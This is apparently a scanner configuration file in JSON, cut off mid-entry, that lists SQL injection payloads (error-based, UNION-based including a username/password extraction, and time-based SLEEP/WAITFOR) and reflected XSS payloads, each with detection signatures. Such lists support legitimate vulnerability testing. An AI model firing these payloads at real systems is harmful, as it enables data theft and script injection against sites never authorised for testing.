[
  {
    "name": "sqli_error_based",
    "class": "sqli",
    "payloads": [
      "' OR '1'='1",
      "' OR '1'='1'--",
      "' OR '1'='1'/*",
      "admin'--",
      "1' AND 1=1--",
      "1' AND 1=2--"
    ],
    "detection_signatures": ["mysql_fetch", "syntax error", "SQLite", "ORA-", "ODBC"]
  },
  {
    "name": "sqli_union_based",
    "class": "sqli",
    "payloads": [
      "' UNION SELECT null--",
      "' UNION SELECT null,null--",
      "' UNION SELECT null,null,null--",
      "' UNION SELECT 1,2,3--",
      "' UNION SELECT username,password FROM users--"
    ],
    "detection_signatures": ["UNION", "column", "number of columns"]
  },
  {
    "name": "sqli_time_based",
    "class": "sqli",
    "payloads": [
      "' AND SLEEP(3)--",
      "' OR SLEEP(3)--",
      "'; WAITFOR DELAY '0:0:3'--",
      "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
    ],
    "detection_signatures": ["response_time > 3000ms"]
  },
  {
    "name": "xss_reflected",
    "class": "xss",
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "'\"><script>alert(document.domain)</script>",
      "<body onload=alert(1)>",
      "javascript:alert(1)"
    ],
    "detection_signatures": ["payload reflected in response without encoding"]
  },
  {
    "name": "xss_stored",
